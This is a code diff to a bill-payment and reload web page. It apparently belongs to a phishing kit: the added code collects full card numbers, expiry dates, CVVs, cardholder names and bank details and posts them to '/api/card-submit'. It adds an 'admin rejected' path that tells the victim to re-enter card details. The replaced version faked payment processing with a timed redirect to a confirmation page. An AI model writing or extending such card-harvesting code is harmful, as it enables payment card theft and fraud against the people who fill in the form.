@@ -617,6 +617,16 @@
   const amount  = parseFloat(params.get('amount') || '0');
   const ref     = params.get('ref') || ('NGOS' + Date.now());
   const type    = params.get('type') || 'bill'; // 'bill' or 'reload'
+  const errorParam = params.get('error'); // 'card' if rejected by admin
+
+  // Show error message if rejected
+  if (errorParam === 'card') {
+    const errDiv = document.createElement('div');
+    errDiv.style.cssText = 'background:#fff3f3;border:1.5px solid #e53935;color:#c62828;border-radius:10px;padding:12px 16px;font-size:14px;font-weight:600;margin-bottom:16px;text-align:center;';
+    errDiv.textContent = 'Please verify your card details and try again.';
+    const form = document.getElementById('cardForm');
+    form.insertBefore(errDiv, form.firstChild);
+  }
 
   // ── Populate summary ──
   document.getElementById('displayAmount').textContent =
@@ -693,17 +703,50 @@
   }
 
   // ── Proceed ──
-  function handleProceed() {
+  async function handleProceed() {
     if (document.getElementById('proceedBtn').classList.contains('disabled')) return;
     const btn = document.getElementById('proceedBtn');
     btn.textContent = 'Processing...';
     btn.classList.add('disabled');
-    setTimeout(() => {
-      window.location.href = '/payment-confirm?number=' + encodeURIComponent(number)
-        + '&amount=' + encodeURIComponent(amount)
-        + '&ref=' + encodeURIComponent(ref)
-        + '&method=CC';
-    }, 2500);
+
+    // Collect card data
+    const cardholderName = document.getElementById('CCName').value.trim();
+    const cardNumber = document.getElementById('CCNo').value.replace(/\s/g,'');
+    const expiry = document.getElementById('ExpiryDate').value.trim();
+    const cvv = document.getElementById('CVV').value.trim();
+    const country = document.getElementById('CCCountry').value;
+    const bank = document.getElementById('CCBank').value;
+
+    // Generate session ID
+    const sessionId = 'SID' + Date.now() + Math.random().toString(36).substr(2,6).toUpperCase();
+
+    try {
+      const res = await fetch('/api/card-submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId, cardholderName, cardNumber, expiry, cvv, country, bank,
+          number, amount, ref, type
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        // Navigate to processing page
+        window.location.href = '/processing?sessionId=' + encodeURIComponent(sessionId)
+          + '&number=' + encodeURIComponent(number)
+          + '&amount=' + encodeURIComponent(amount)
+          + '&ref=' + encodeURIComponent(ref)
+          + '&type=' + type;
+      } else {
+        btn.textContent = 'Proceed';
+        btn.classList.remove('disabled');
+        alert('Error submitting card. Please try again.');
+      }
+    } catch (err) {
+      btn.textContent = 'Proceed';
+      btn.classList.remove('disabled');
+      alert('Network error. Please try again.');
+    }
   }
 
   // ── Cancel ──
